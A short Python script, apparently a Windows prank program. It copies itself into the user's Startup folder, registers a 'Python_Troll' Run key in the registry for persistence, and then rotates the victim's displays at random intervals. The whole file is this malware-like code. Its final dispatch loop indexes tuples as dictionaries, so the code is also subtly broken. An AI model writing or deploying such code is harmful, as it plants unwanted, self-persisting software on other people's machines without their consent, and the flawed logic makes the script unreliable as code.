import rotatescreen
import shutil
import winshell
import time
import winreg as reg
import random
import sys
import threading


def write_to_autostart(preferences):
    print("write_to_autostart")
    path = sys.argv[0]
    if "Startup" not in path:
        try:
            filename = sys.argv[0].split("\\")[-1]
            startup_filename = winshell.startup() + "\\" + filename
            shutil.copy(sys.argv[0], startup_filename)
            
            key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
            open = reg.OpenKey(reg.HKEY_CURRENT_USER, key_value, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open,"Python_Troll", 0, reg.REG_SZ, startup_filename)
            reg.CloseKey(open)
        except:
            pass

        print("wrote to autostart")
    else:
        print("already installed")
        pass
    pass

def rotate_screen(preferences):
    print("rotate_screen")
    screen = rotatescreen.get_primary_display()
    try:
        sec_screen = rotatescreen.get_secondary_displays()
    except:pass
    while True:
        time.sleep(random.randint(int(preferences["interval"][0])*60 , int(preferences["interval"][1])*60))
        try:
            screen.rotate_to(random.randint(1,5)*90 % 360)
            sec_screen.rotate_to(random.randint(1,5)*90 % 360)
        except:
            pass
        print("rotated screen")
        time.sleep(10)
        try:
            screen.set_landscape()
            sec_screen.set_landscape()
        except: pass

abilities = {
    'write_to_autostart':
        (write_to_autostart, {"active":True}),
    'rotate_screen':
        (rotate_screen, {"active":True, "interval":[1,2]})
}

for ability in abilities:
    if abilities[ability]["active"]:
        p = threading.Thread(target=abilities[ability][0], args=(abilities[ability][1],))
        p.start()
